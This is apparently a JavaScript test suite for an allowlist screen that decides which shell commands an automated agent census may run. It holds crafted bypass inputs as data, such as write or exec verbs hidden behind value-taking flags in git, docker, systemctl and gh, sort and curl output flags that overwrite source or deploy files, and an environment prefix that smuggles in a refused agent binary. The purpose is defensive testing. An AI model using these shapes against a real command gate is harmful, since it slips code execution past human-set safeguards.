const WAVE4_REACH = 240; // the shipped baseline wave 5 moved
const WAVE5_REACH = 254; // wave 5: +16 admitted, -2 refused; every one named below
// tgw12-s1 — the value-taking-global collision fix. `firstNonFlag` no longer
// misreads a value-consuming global's ARGUMENT as the sub-verb, which closes the
// WRITE side (`git -C log push`, `go -C env run`, `npm --prefix ls install`) and,
// as its mirror, ADMITS four `git -C <path> <read-verb>` corpus rows that were
// FALSELY REFUSED before (their `-C` path read as the verb). Pure widening on the
// corpus — no row is newly refused — and all four are named member-by-member in
// the "value-taking-global collision" test below.
const SCREEN_REACH = 258; // 254 + 4 false-refusal fixes; every one named below
const COLLISION_FIX_REACH = SCREEN_REACH - WAVE5_REACH; // 4

test("census reach is RE-MEASURED and its delta is accounted for, member by member", () => {
  const corpus = JSON.parse(readFileSync(fileURLToPath(new URL("../fixtures/evidence-corpus.json", import.meta.url)), "utf8"));
  const commands = corpus.proofs.map((p) => p?.command).filter((c) => typeof c === "string" && c.trim());
  const r = screenAll(commands);
  assert.equal(r.total, 651);

  console.log(
    `\nCENSUS REACH, wave 4 -> wave 5 -> tgw12-s1 over the same ${r.total} frozen commands:\n` +
      `  ${WAVE4_REACH} -> ${WAVE5_REACH} -> ${r.admitted}  (${r.admitted > WAVE4_REACH ? "+" : ""}${r.admitted - WAVE4_REACH} net)\n` +
      `  WAVE 5 WIDENINGS  +16  read-only \`sed\` (15 line-citation rows) and the host bound moved AFTER quote masking (1 row\n` +
      `                        whose grep PATTERN names guerrilla and two prod IPs)\n` +
      `  WAVE 5 TIGHTENINGS  -2  both environment-assignment prefixes, both correctly refused (asserted individually below)\n` +
      `  tgw12-s1 WIDENINGS  +${COLLISION_FIX_REACH}  four \`git -C <path> <read-verb>\` rows the value-global collision falsely refused\n` +
      `                        (the eaten \`-C\` path read as the sub-verb); named member-by-member in the collision test`,
  );

  assert.equal(r.admitted, SCREEN_REACH, "the screen's admission over the frozen corpus — re-derive and re-state, never re-baseline silently");
  assert.ok(r.admitted > WAVE4_REACH, "the widenings must RAISE reach, not merely hold it");
});

test("every corpus row the tightenings newly REFUSE is named and justified", () => {
  // Criterion: no command the frozen corpus actually contains may be newly
  // refused WITHOUT being named. Exactly two are, and both are the env-prefix
  // fix doing precisely its job — so they are asserted by hand here rather than
  // absorbed into the count above.
  //
  // The second is the sharper proof. `claude` is in REFUSED_HEADS by name
  // ("claude spawns an agent that can do anything this process can"), and
  // `CLAUDE_BIN=<path to claude>` walked that refused head straight back in
  // through the environment, under an allowlisted `mix test`. The env-strip was
  // not merely a theoretical primitive: the corpus contains a live instance of
  // it.
  const newlyRefused = [
    [
      'CC=/usr/bin/clang MIX_TEST_PARTITION=felixv3 PATH="$FB:$PATH" mix test test/barkpark/sites/deploy_runner_test.exs:583',
      "PATH=",
    ],
    [
      'cd api && CLAUDE_BIN="/Applications/cmux.app/Contents/Resources/bin/claude" CC=clang mix test --only real_binary test/barkpark_web/studio/claude_chat_real_binary_test.exs',
      "CLAUDE_BIN=",
    ],
  ];
  for (const [cmd, why] of newlyRefused) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `MUST REFUSE: ${cmd}`);
    assert.ok(r.reason.includes(why), `the refusal must name ${why} — got: ${r.reason}`);
  }
});

// ── 9b. THE VALUE-TAKING-GLOBAL COLLISION (tgw12-s1) ─────────────────────────
//
// `firstNonFlag` skipped flag TOKENS but did not model that a value-consuming
// GLOBAL eats its NEXT token as a value. So `git -C log push` — `git push` run
// in a directory named `log` — had `push` masked by the eaten value `log`, and
// `gitRule` judged the read-verb `log` and ADMITTED a force-pushable write. The
// same hole rode `go -C env run main.go` (code execution) and `npm --prefix ls
// install` (postinstall code execution). This is the SOLE gate the live census
// executes through (census.mjs: "the safety bound is screenCommand and NOTHING
// ELSE"), so each false-admit is an EXECUTION against a shared checkout.
//
// The fix — `dropValueGlobals` feeding `firstNonFlag` — is ONE normaliser shared
// by git/go/npm, not five hand-copies of the grammar (this epic's named defect
// class). gh is NOT vulnerable (its two-level noun+sub-verb check catches the
// same shape) and is deliberately left untouched.

test("the value-taking-global collision is REFUSED — a global's eaten arg is not the sub-verb", () => {
  // WRITE commands masked behind a value-global whose argument is a read-verb name.
  const refused = [
    // git — every value-taking git global, arg = a read-verb name, real verb a write.
    "git -C log push origin main",
    "git -c log push origin main",
    "git --git-dir show reset --hard",
    "git --work-tree status commit -m x",
    "git --namespace diff push",
    "git --exec-path log push",
    "git --super-prefix show push",
    "git --attr-source log push",
    "git --config-env log push",
    // go — `-C` is the only pre-verb global; the eaten dir hid `run`/`build`.
    "go -C env run main.go",
    "go -C list build",
    // npm — `--prefix`/`-C` hid `install`/`publish` (postinstall code execution).
    "npm --prefix ls install",
    "npm -C ls publish",
    "npm --workspace view add lodash",
  ];
  for (const cmd of refused) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `MUST REFUSE the collision: ${cmd} → ${r.reason}`);
  }

  // gh is immune WITHOUT a change — its noun+sub-verb + write-verb scan catch it.
  assert.equal(screenCommand("gh --repo pr issue create").ok, false, "gh stays refused, unchanged");
});

test("the collision fix does NOT over-refuse legitimate value-global reads", () => {
  // The MIRROR of the hole: a value-global with an honest path/name argument is a
  // READ, and was FALSELY REFUSED before (its eaten arg read as the sub-verb).
  const admitted = [
    "git -C /some/dir log",
    "git -C /some/dir status",
    "git -c core.pager=cat log",
    "git -C /some/dir diff --cached -- api/lib/x.ex",
    "git -C /some/dir rev-parse HEAD origin/main",
    "npm --prefix /tmp/proj ls",
    "npm -C /tmp/proj outdated",
  ];
  for (const cmd of admitted) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, true, `MUST ADMIT the honest read: ${cmd} → ${r.reason}`);
  }
  // And the same letters AFTER the verb keep their real (write) meaning: the
  // pre-verb-only restriction must not strip `git branch -C` (COPY a branch).
  assert.equal(screenCommand("git branch -C old new").ok, false, "git branch -C COPIES a branch — a write");
  assert.equal(screenCommand("git branch -m old new").ok, false, "git branch -m MOVES a branch — a write");
});

test("the four corpus rows the collision fix newly ADMITS are named, member by member", () => {
  // The +4 in the census-reach accounting above, pinned by identity rather than
  // absorbed into a count. Every one is `git -C <worktree-path> <read-verb>` — an
  // honest read the value-global collision falsely refused.
  const NEWLY_ADMITTED = [
    "git -C /Volumes/SATECHI/github/barkpark/.claude/worktrees/wf_e3a3a728-f3c-19 diff --cached -- api/lib/barkpark_web/controllers/chat_controller.ex",
    "git -C /Volumes/SATECHI/github/barkpark/.claude/worktrees/wf_69c5ed79-8ea-23 diff --cached -- api/lib/barkpark_web/controllers/chat_controller.ex",
    "git -C /Volumes/SATECHI/github/barkpark show origin/main:.claude/workflows/bp-connectors-charter.md | grep -n 'D10[7-9]\\|D11[0-5]' | head -20",
    "git -C /Volumes/SATECHI/github/barkpark rev-parse HEAD origin/main",
  ];
  for (const cmd of NEWLY_ADMITTED) {
    assert.equal(screenCommand(cmd).ok, true, `this row must ADMIT after the fix: ${cmd}`);
  }
  // And they are drawn from the frozen corpus — not invented for the test.
  const corpus = JSON.parse(readFileSync(CORPUS, "utf8"));
  const commands = new Set(corpus.proofs.map((p) => p?.command).filter((c) => typeof c === "string" && c.trim()));
  for (const cmd of NEWLY_ADMITTED) {
    assert.ok(commands.has(cmd), `named row must exist in the frozen corpus: ${cmd}`);
  }
  assert.equal(NEWLY_ADMITTED.length, COLLISION_FIX_REACH, "the named rows must account for the whole +4 delta");
});

// ── 9c. THE PNPM/DOCKER VALUE-TAKING-GLOBAL COLLISION (sibling of tgw12-s1) ──
//
// `verbRule` (docker, systemctl, launchctl, pnpm) fed `firstNonFlag` straight
// off `argv`, with no `dropValueGlobals` normalisation — the same hole 9b
// fixed for git/go/npm, unfixed here. Confirmed live on origin/main before
// this fix: `pnpm -C ls add lodash` and `pnpm --prefix ls install` both
// ADMITTED (`add`/`install` are writes/code-exec, judged as the eaten value
// `ls`), and `docker --host ps exec -it foo bash` ADMITTED `docker exec` —
// arbitrary code execution inside a container — because `--host`'s eaten
// value `ps` collided with an allowlisted docker verb, so the real verb
// `exec` two tokens later was never examined. systemctl/launchctl were left
// alone (out of THIS fix's fence: pnpm + docker only) — systemctl carried the
// identical hole and is closed below in 9d; launchctl was checked and cleared,
// also in 9d; gh — a bespoke rule, not built on `verbRule` — carried the same
// hole under its own noun/sub-verb allowlist and is closed in 9e.

test("pnpm/docker value-taking-global collision is REFUSED — a global's eaten arg is not the sub-verb", () => {
  const refused = [
    // pnpm — `-C`/`--prefix` hid `add`/`install` (writes / code-exec).
    "pnpm -C ls add lodash",
    "pnpm --prefix ls install",
    "pnpm -C view add lodash",
    // docker — `-H`/`--host`/`--context`/`--config` hid `exec`/`run` (code exec).
    "docker --host ps exec -it foo bash",
    "docker -H info run --rm -v /:/host alpine sh",
    "docker --context ps exec -it foo bash",
    "docker --config ps run --privileged alpine sh",
  ];
  for (const cmd of refused) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `MUST REFUSE the collision: ${cmd} → ${r.reason}`);
  }
});

test("the pnpm/docker collision fix does NOT over-refuse legitimate value-global reads", () => {
  const admitted = [
    "pnpm ls",
    "pnpm -C /some/dir ls",
    "pnpm -C /some/dir view foo",
    "pnpm --prefix /some/dir outdated",
    "docker ps",
    "docker -H tcp://myhost:2375 ps",
    "docker --host tcp://myhost:2375 images",
    "docker --config /home/me/.docker version",
    "docker --context myctx info",
  ];
  for (const cmd of admitted) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, true, `MUST ADMIT the honest read: ${cmd} → ${r.reason}`);
  }
});

test("MUTATION PROOF: reverting pnpm/docker to a bare verbRule (no value-globals) re-admits the collision", () => {
  // Mirrors the module's own dropValueGlobals mechanism rather than reimplementing
  // a parallel comparison — proves the FIX, not a copy of the fix's logic.
  const bareVerbRule = (verbs, label) => ({
    verbs: new Set(verbs),
    check(argv) {
      const verb = argv.slice(1).find((t) => !t.startsWith("-")) ?? null;
      if (verb === null) return `${argv[0]} without a sub-verb`;
      if (!this.verbs.has(verb)) return `${argv[0]} sub-verb "${verb}" is not on the read-only allowlist (${[...verbs].sort().join(", ")})`;
      return null;
    },
  });
  const reverted = {
    pnpm: bareVerbRule(["ls", "view", "info", "outdated", "why", "list", "root", "bin"], "pnpm"),
    docker: bareVerbRule(["ps", "images", "logs", "inspect", "version", "info", "stats", "top", "port"], "docker"),
  };
  const tokenize = (cmd) => cmd.split(" ");
  assert.equal(reverted.pnpm.check(tokenize("pnpm -C ls add lodash")), null, "REVERTED rule ADMITS the pnpm collision (proves the shipped fix earns its keep)");
  assert.equal(reverted.docker.check(tokenize("docker --host ps exec -it foo bash")), null, "REVERTED rule ADMITS the docker collision (proves the shipped fix earns its keep)");
  // And the shipped screenCommand — using the real dropValueGlobals fix — still refuses both live.
  assert.equal(screenCommand("pnpm -C ls add lodash").ok, false, "shipped fix REFUSES");
  assert.equal(screenCommand("docker --host ps exec -it foo bash").ok, false, "shipped fix REFUSES");
});

// ── 9d. THE SYSTEMCTL VALUE-TAKING-GLOBAL COLLISION (second head of 9c) ─────
//
// 9c's own comment said "systemctl/launchctl are left alone (out of this task's
// fence: pnpm + docker only)" — a scope statement, not a clearance. systemctl was
// STILL registered as a bare `verbRule(...)` with no third `valueGlobals` arg, so
// `dropValueGlobals` never ran for it. Confirmed live on origin/main before this
// fix: `systemctl -H status restart barkpark.service` ADMITTED — `-H`'s eaten
// separate-token value `status` collided with systemctl's own allowlisted read
// verb `status`, so the real (mutating) verb `restart` two tokens later was never
// examined. Layer (c)'s WRITE_SHAPES backstop does not catch it either: its
// systemctl regex requires the mutating verb immediately after `systemctl `, and
// a global-plus-eaten-value sits in between.
//
// launchctl was RE-VERIFIED here, not merely re-asserted: `man launchctl`'s own
// SYNOPSIS is `launchctl subcommand [arguments ...]` — no pre-verb global-option
// region at all, so there is no token position for a value-eating global to
// occupy before the subcommand. No counter-example was found; launchctl is left
// on a bare `verbRule` on purpose.
test("systemctl value-taking-global collision is REFUSED — a global's eaten arg is not the sub-verb", () => {
  const refused = [
    "systemctl -H status restart barkpark.service",
    "systemctl --host status restart barkpark.service",
    "systemctl -M status restart barkpark.service",
    "systemctl --machine status restart barkpark.service",
    "systemctl --root status restart barkpark.service",
  ];
  for (const cmd of refused) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `MUST REFUSE the collision: ${cmd} → ${r.reason}`);
  }
  // The control: the bare mutating verb, no decoy global, was already refused
  // before this fix and must stay refused.
  assert.equal(screenCommand("systemctl restart barkpark.service").ok, false);
});

test("the systemctl collision fix does NOT over-refuse legitimate value-global reads", () => {
  const admitted = [
    "systemctl status barkpark.service",
    "systemctl -H example.com status barkpark.service",
    "systemctl --host example.com status barkpark.service",
    "systemctl -M mycontainer status barkpark.service",
    "systemctl is-active barkpark.service",
  ];
  for (const cmd of admitted) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, true, `MUST ADMIT the honest read: ${cmd} → ${r.reason}`);
  }
});

test("MUTATION PROOF: reverting systemctl to a bare verbRule (no value-globals) re-admits the collision", () => {
  const bareVerbRule = (verbs, label) => ({
    verbs: new Set(verbs),
    check(argv) {
      const verb = argv.slice(1).find((t) => !t.startsWith("-")) ?? null;
      if (verb === null) return `${argv[0]} without a sub-verb`;
      if (!this.verbs.has(verb)) return `${argv[0]} sub-verb "${verb}" is not on the read-only allowlist (${[...verbs].sort().join(", ")})`;
      return null;
    },
  });
  const reverted = bareVerbRule(
    ["is-active", "is-enabled", "is-failed", "status", "show", "cat", "list-units", "list-unit-files", "get-default"],
    "systemctl",
  );
  const tokenize = (cmd) => cmd.split(" ");
  assert.equal(reverted.check(tokenize("systemctl -H status restart barkpark.service")), null,
    "REVERTED rule ADMITS the systemctl collision (proves the shipped fix earns its keep)");
  // And the shipped screenCommand — using the real dropValueGlobals fix — still refuses it live.
  assert.equal(screenCommand("systemctl -H status restart barkpark.service").ok, false, "shipped fix REFUSES");
});

// ── 9e. THE GH VALUE-TAKING-GLOBAL COLLISION (third head of 9c, bespoke rule) ─
//
// `ghRule` is NOT built on the shared `verbRule` factory — it has its own
// two-level noun→sub-verb allowlist (`GH_READ_NOUNS`), the same shape as
// `npmRule`. So threading `valueGlobals` through `verbRule` alone could never
// have reached it; #13346 and 9c/9d's fix both leave a bespoke rule with the
// identical positional hole untouched unless that rule gets the same
// `dropValueGlobals` defence applied explicitly inside its own `check`.
//
// Confirmed live on origin/main before this fix: `gh -R status repo clone
// owner/repo /tmp/evil` ADMITTED — `-R`'s eaten separate-token value `status`
// collided with gh's own read noun `status` (mapped to "any sub-verb" in
// `GH_READ_NOUNS`), so the real noun+sub-verb pair `repo clone` — a write that
// clones an arbitrary repository to disk — was never checked against the
// allowlist, and `clone` is deliberately absent from the `GH_WRITE_VERBS`
// denylist (that loop is a second-layer catch, not the gate; `repo clone` and
// `release download` were pulled OUT of it into the noun/sub-verb allowlist for
// exactly this reason, per the module's own comment).
test("gh value-taking-global collision is REFUSED — a global's eaten arg is not the noun", () => {
  const refused = [
    "gh -R status repo clone owner/repo /tmp/evil",
    "gh --repo status repo clone owner/repo /tmp/evil",
    "gh -R status release download owner/repo",
    "gh --repo status release download owner/repo",
  ];
  for (const cmd of refused) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `MUST REFUSE the collision: ${cmd} → ${r.reason}`);
  }
  // The controls: no decoy -R/--repo, and a write verb behind a decoy, were
  // already refused before this fix and must stay refused.
  assert.equal(screenCommand("gh repo clone owner/repo /tmp/evil").ok, false);
  assert.equal(screenCommand("gh -R status pr merge 123").ok, false);
});

test("the gh collision fix does NOT over-refuse legitimate value-global reads", () => {
  const admitted = [
    "gh -R owner/repo pr view 1",
    "gh --repo owner/repo issue list",
    "gh -R owner/repo repo view",
    "gh pr view 1",
  ];
  for (const cmd of admitted) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, true, `MUST ADMIT the honest read: ${cmd} → ${r.reason}`);
  }
});

test("MUTATION PROOF: reverting ghRule to read the noun straight off argv re-admits the collision", () => {
  // Mirrors ghRule's OWN pre-fix shape (firstNonFlag on raw argv, no
  // dropValueGlobals) rather than reimplementing a parallel comparison — proves
  // the FIX, not a copy of the fix's logic.
  const firstNonFlag = (argv, from = 1) => argv.slice(from).find((t) => !t.startsWith("-")) ?? null;
  const GH_READ_NOUNS = new Map([
    ["repo", new Set(["view", "list"])],
    ["status", null],
  ]);
  const bareGhCheck = (argv) => {
    const noun = firstNonFlag(argv);
    if (noun === null) return "gh without a sub-verb";
    if (!GH_READ_NOUNS.has(noun)) return `gh noun "${noun}" is not on the read-only allowlist`;
    const subs = GH_READ_NOUNS.get(noun);
    if (subs) {
      const sub = firstNonFlag(argv, argv.indexOf(noun) + 1);
      if (sub === null) return `gh ${noun} without a sub-verb`;
      if (!subs.has(sub)) return `gh ${noun} sub-verb "${sub}" is not read-only`;
    }
    return null;
  };
  const tokenize = (cmd) => cmd.split(" ");
  assert.equal(bareGhCheck(tokenize("gh -R status repo clone owner/repo /tmp/evil")), null,
    "REVERTED rule ADMITS the gh collision (proves the shipped fix earns its keep)");
  // And the shipped screenCommand — using the real dropValueGlobals fix — still refuses it live.
  assert.equal(screenCommand("gh -R status repo clone owner/repo /tmp/evil").ok, false, "shipped fix REFUSES");
});

// ── 10. THE ARBITRARY FILE-OVERWRITE PRIMITIVE (wave 4) ──────────────────────
//
// `sort`, `uniq` and `tree` shipped as bare `plainRule()`, filed under
// "searching + shaping text (none of these can execute a string)". True, and
// the wrong question — all three write a file on request, and
// `screenCommand("sort input.txt -o api/lib/barkpark/application.ex").ok` was
// `true`. A live probe turned a victim file from "original content" into
// "PWNED" through that shape.
//
// The outcome is BYTE-IDENTICAL to `cp /tmp/evil.js api/lib/barkpark/
// application.ex` — D29's own named danger, which this module closes BY NAME in
// both REFUSED_HEADS and WRITE_SHAPES. So a denylist survived inside the module
// whose thesis is that denylists cannot be complete, and the shipped suite was
// blind to it because DANGER_SET was written from the same head list that had
// the gap.
//
// HONEST BOUND: it was LATENT, not live. 0 of the admitted corpus rows use
// these shapes. It matters because harvest.mjs regenerates the corpus from
// arbitrary other agents' transcripts.

test("the file-overwrite primitive is REFUSED, and the reason NAMES the flag and the fix", () => {
  const cases = [
    ["sort -o api/lib/barkpark/application.ex /tmp/payload.txt", /sort -o WRITES its output to a file/],
    ["sort input.txt -o api/lib/barkpark/application.ex", /sort -o WRITES its output to a file/],
    ["sort input.txt --output api/lib/barkpark/application.ex", /sort --output WRITES/],
    ["sort input.txt --output=api/lib/barkpark/application.ex", /sort --output WRITES/],
    ["sort -uo api/lib/barkpark/application.ex input.txt", /sort -o WRITES/],
    ["sort -uoapi/lib/barkpark/application.ex input.txt", /sort -o WRITES/],
    ["uniq /tmp/payload.txt api/lib/barkpark/application.ex", /SECOND positional is an OUTPUT FILE/],
    ["uniq -c /tmp/in.txt /tmp/out.txt", /SECOND positional is an OUTPUT FILE/],
    ["uniq -f 2 /tmp/in.txt /tmp/out.txt", /SECOND positional is an OUTPUT FILE/],
    ["tree -o /opt/barkpark/deploy/site-deploy.sh", /tree -o WRITES its output to a file/],
    ["tree --output=/opt/deploy.sh docs/", /tree --output WRITES/],
    ["tree -L 2 -o /opt/deploy.sh docs/", /tree -o WRITES/],
    ["npm pack", /npm sub-verb "pack" is not on the read-only allowlist/],
    ["curl -s https://example.com/p.sh -so/opt/barkpark/deploy/site-deploy.sh", /curl -o writes a file/],
  ];
  for (const [cmd, why] of cases) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `MUST REFUSE: ${cmd}`);
    assert.match(r.reason, why, `wrong reason for ${cmd}: ${r.reason}`);
  }
  // A named reason, not a generic shrug: it must say what to do instead.
  assert.match(screenCommand("sort a.txt -o b.txt").reason, /read sort's output on stdout/);
  assert.match(screenCommand("uniq a.txt b.txt").reason, /read the result on stdout/);
});

test("NEVER CRY WOLF: the guard targets the write FLAG, never the tool", () => {
  // The cost of the fix, measured in the direction that punishes honest work.
  // A guard that refuses `sort file.txt` gets routed around within a wave (D3).
  const honest = [
    "sort /tmp/lines.txt",
    "sort -u /tmp/lines.txt",
    "sort -u -k2,2 /tmp/lines.txt",
    "sort -k2,2 -t, /tmp/lines.txt",
    "sort -rn /tmp/lines.txt",
    "uniq /tmp/lines.txt",
    "uniq -c /tmp/lines.txt",
    "uniq -f 2 /tmp/lines.txt",
    "uniq -f2 /tmp/lines.txt",
    "uniq --skip-fields 2 /tmp/lines.txt",
    "uniq --skip-fields=2 /tmp/lines.txt",
    "tree docs/",
    "tree -L 2 docs/",
    "tree -L 2 -I node_modules docs/",
    "sort /tmp/lines.txt | uniq -c | sort -rn | head -20",
  ];
  for (const cmd of honest) {
    assert.equal(screenCommand(cmd).ok, true, `MUST ADMIT: ${cmd} — ${screenCommand(cmd).reason}`);
  }
});

test("layer (c) BACKSTOPS the same shapes, so the refusal survives a head-rule edit", () => {
  // Two layers, not one. Layer (b) is the gate; this is the catch for the
  // mistake that CREATED this hole — a head registered as a bare plainRule().
  // Proven the way layer (c) is always proven here: directly, so "unreachable"
  // never quietly becomes "untested".
  for (const [cmd, why] of [
    ["sort input.txt -o api/lib/barkpark/application.ex", /sort -o\/--output writes a file/],
    ["sort -o /opt/deploy.sh in.txt", /sort -o\/--output writes a file/],
    ["tree -o /opt/barkpark/deploy/site-deploy.sh", /tree -o\/--output writes a file/],
    ["uniq /tmp/in.txt api/lib/barkpark/application.ex", /uniq's second positional is an output file/],
    ["git log | uniq /tmp/in.txt /tmp/out.txt", /uniq's second positional is an output file/],
  ]) {
    const got = writeShapeReason(cmd);
    assert.ok(got, `layer (c) must catch: ${cmd}`);
    assert.match(got, why, `${cmd} → ${got}`);
  }
  // And the backstop must not fire on the honest reads either — a second layer
  // that cries wolf is a second layer that gets deleted.
  for (const c of ["sort /tmp/lines.txt", "sort -u -k2,2 f.txt", "uniq -c /tmp/lines.txt", "uniq -f 2 f.txt", "tree docs/", "tree -L 2 -I node_modules docs/"]) {
    assert.equal(writeShapeReason(c), null, `layer (c) must not fire on: ${c}`);
  }
});

test("MUTATION PROOF (D18): with the head guard reverted to plainRule, layer (c) still refuses", () => {
  // A guard that has never been observed failing is not a guard. This reverts
  // the layer-(b) fix in the exact shape the original defect had — `sort`,
  // `uniq` and `tree` re-registered as bare plainRule() — and asserts the
  // command is STILL refused, by layer (c), naming layer (c)'s reason.
  //
  // ALLOWED_HEADS is a live Map, so the mutation is real and is restored in a
  // finally block. Nothing else in this file depends on the map's contents at
  // module scope.
  const plainRule = { check: () => null };
  const saved = new Map([["sort", ALLOWED_HEADS.get("sort")], ["uniq", ALLOWED_HEADS.get("uniq")], ["tree", ALLOWED_HEADS.get("tree")]]);
  const probes = [
    "sort -o api/lib/barkpark/application.ex /tmp/payload.txt",
    "sort input.txt -o api/lib/barkpark/application.ex",
    "uniq /tmp/payload.txt api/lib/barkpark/application.ex",
    "tree -o /opt/barkpark/deploy/site-deploy.sh",
  ];
  try {
    for (const head of saved.keys()) ALLOWED_HEADS.set(head, plainRule);

    // FIRST: prove the mutation actually removed the layer-(b) refusal, so the
    // control is measuring what it claims. Without this the test could pass
    // because the mutation silently did nothing.
    for (const cmd of probes) {
      assert.equal(screenSegment(cmd), null, `the mutation must remove the layer (b) refusal for: ${cmd}`);
    }

    // SECOND: the command is still refused — by layer (c).
    for (const cmd of probes) {
      const r = screenCommand(cmd);
      assert.equal(r.ok, false, `layer (c) must still refuse with layer (b) reverted: ${cmd}`);
      assert.match(r.reason, /^write shape:/, `${cmd} → ${r.reason}`);
    }
  } finally {
    for (const [head, rule] of saved) ALLOWED_HEADS.set(head, rule);
  }
  // Restored: the normal verdict comes from layer (b) again.
  assert.match(screenCommand("sort input.txt -o api/x.ex").reason, /^not allowlisted: sort -o WRITES/);
});

test("the size of the gap is RE-DERIVED, never remembered", async () => {
  // RETIRES the old "N of 31 synthetic commands rated SAFE" headline — a number
  // nothing in the tree could reproduce, over a set that no longer exists. It
  // lived in SHIPPED SOURCE (screen.mjs's header and this file), which is how an
  // unrecoverable statistic gets quoted as if it were measured. The exact string
  // is deliberately not written out anywhere below; the guard at the end of this
  // test greps for it.
  //
  // The replacement is computed here, on every run, against the REAL
  // classifySafety. Where the number belongs to ANOTHER module, a MARGIN is
  // asserted rather than a count, so growing DANGER_SET or tightening rerun.mjs
  // cannot make the claim stale — the failure this replacement exists to
  // prevent, and one this test committed itself until the wave-4 merge caught
  // it (see the classifySafety assertion below).
  const { classifySafety } = await import("../rerun.mjs");

  const csAdmits = DANGER_SET.filter((c) => classifySafety(c).safe);
  const screenAdmits = DANGER_SET.filter((c) => screenCommand(c).ok);
  assert.deepEqual(screenAdmits, [], "the screen must admit NONE of the DANGER SET");
  // THIS ASSERTION USED TO SAY "ALL", AND WAVE 5 CAUGHT IT DOING THE THING THIS
  // TEST EXISTS TO PREVENT — one comment above, it warns that "growing
  // DANGER_SET ... cannot make the claim stale", while asserting an ABSOLUTE
  // over a set every wave grows, about a module this suite does not own. Wave 5
  // added 24 shapes and the absolute went red on two of them.
  //
  // ...AND WAVE 9 CAUGHT ITS REPLACEMENT DOING IT AGAIN. The re-statement below
  // was `deepEqual(rows rerun refuses, rows matching /^sed -i/)` — an ABSOLUTE
  // once more, just spelled as a hand-written predicate instead of a count. It
  // went red the moment this wave added `npm --tag ls publish`, which rerun.mjs
  // happens to catch on its own `publish` shape. Nothing had tightened; the
  // hand-written predicate had simply gone stale, which is the exact failure
  // three paragraphs of this test's own preamble forbid.
  //
  // So the overlap is RE-DERIVED from rerun.mjs's own verdict, never from a
  // pattern written here — and what is ASSERTED is a MARGIN plus a set of NAMED
  // shapes, the two forms that cannot go stale as DANGER_SET grows:
  //
  //   * the overlap is refused for a reason rerun.mjs itself names, not by
  //     accident of some other code path;
  //   * the overlap stays a small MINORITY — the gap is the finding;
  //   * and the named rows below, each an outage, are still ADMITTED by
  //     rerun.mjs. Only a genuine tightening can red that, which is the one
  //     failure this comparison is for.
  const CS_CATCHES = DANGER_SET.filter((c) => !classifySafety(c).safe);
  assert.ok(CS_CATCHES.length >= 2, "rerun.mjs's denylist must still catch SOMETHING, or this comparison is measuring nothing");
  for (const c of CS_CATCHES) {
    assert.match(classifySafety(c).reason, /^write-shaped verb: /, `the overlap must come from rerun.mjs's own named WRITE_SHAPES, not a side path: ${c}`);
  }
  assert.ok(
    CS_CATCHES.length * 4 <= DANGER_SET.length,
    `the GAP is the finding: rerun.mjs catches ${CS_CATCHES.length} of ${DANGER_SET.length} DANGER SET shapes. ` +
      `If this ratio has genuinely improved, RE-STATE the margin — do not delete the assertion.`,
  );
  for (const stillAdmitted of [
    "systemctl restart barkpark.service",
    "systemctl stop barkpark.service",
    "bash /opt/barkpark/deploy/site-deploy.sh",
    "git fetch origin",
    "kill -9 4242",
  ]) {
    assert.ok(DANGER_SET.includes(stillAdmitted), `this comparison names a row DANGER_SET must carry: ${stillAdmitted}`);
    assert.equal(classifySafety(stillAdmitted).safe, true,
      `rerun.mjs is expected to ADMIT ${stillAdmitted} — that gap is why screen.mjs exists. ` +
        `If rerun.mjs has genuinely tightened, RE-STATE this list rather than re-baselining it.`);
    assert.equal(screenCommand(stillAdmitted).ok, false, `and the screen must refuse it: ${stillAdmitted}`);
  }

  const corpus = JSON.parse(readFileSync(CORPUS, "utf8"));
  const commands = [...new Set(corpus.proofs.map((p) => p?.command).filter((c) => typeof c === "string" && c.trim()))];
  const csCorpus = commands.filter((c) => classifySafety(c).safe).length;
  const screenCorpus = commands.filter((c) => screenCommand(c).ok).length;

  console.log(
    `\nTHE GAP, RE-DERIVED — this is the statistic; the old synthetic-set headline is retired:\n` +
      `  DANGER SET (${DANGER_SET.length})  classifySafety admits ${csAdmits.length}/${DANGER_SET.length}   screenCommand admits ${screenAdmits.length}/${DANGER_SET.length}\n` +
      `  corpus (${commands.length})     classifySafety admits ${csCorpus} (${((csCorpus / commands.length) * 100).toFixed(1)}%)   screenCommand admits ${screenCorpus} (${((screenCorpus / commands.length) * 100).toFixed(1)}%)`,
  );

  assert.equal(commands.length, 651);
  // THE SCREEN'S OWN NUMBER IS PINNED — this module is what this suite owns, and
  // a silent change to its reach is the finding. It moved DELIBERATELY twice,
  // 240 -> 254 (wave 5) -> 258 (tgw12-s1's collision fix), and each move is
  // accounted for member-by-member in the two "census reach" / "collision" tests
  // above rather than re-baselined here.
  assert.equal(screenCorpus, SCREEN_REACH, "the screen's admission over the frozen corpus");

  // classifySafety's NUMBER IS NOT PINNED, AND THAT IS THE POINT — found by
  // merging this wave's five branches into one tree, where each slice was green
  // alone and the union went red. `assert.equal(csCorpus, 572)` froze a count
  // belonging to rerun.mjs, a module this suite does not own and must not
  // constrain. tgw4-rerun-silence-fixes legitimately moved it to 583 (the
  // `merge(?!-base)` carve-out re-admits 11 `git merge-base` rows), and a
  // correct fix in one slice turned another slice's test red at merge time.
  //
  // Two failures in one line, and the second is the sharper: the comment above
  // claims "ratios are asserted, not counts" while three frozen counts sat
  // below it — the retired-statistic disease this very test exists to cure,
  // committed inside the cure. So the comparison is now stated as what it
  // actually claims: the older gate is MUCH more permissive. The margin is
  // asserted; the exact figure is printed, never frozen.
  assert.ok(
    csCorpus >= screenCorpus * 2,
    `the comparison is only worth making while classifySafety is MUCH more permissive than the screen — ` +
    `it admitted ${csCorpus} against the screen's ${screenCorpus}. If rerun.mjs has genuinely tightened to ` +
    `within 2x, this comparison must be re-stated rather than re-baselined.`,
  );
  assert.ok(screenCorpus < csCorpus, "the screen must be strictly tighter than the denylist it replaces");

  // The retired number must not be re-introduced into shipped source.
  for (const path of [SCREEN_MJS, fileURLToPath(new URL("./screen.test.mjs", import.meta.url))]) {
    const src = readFileSync(path, "utf8");
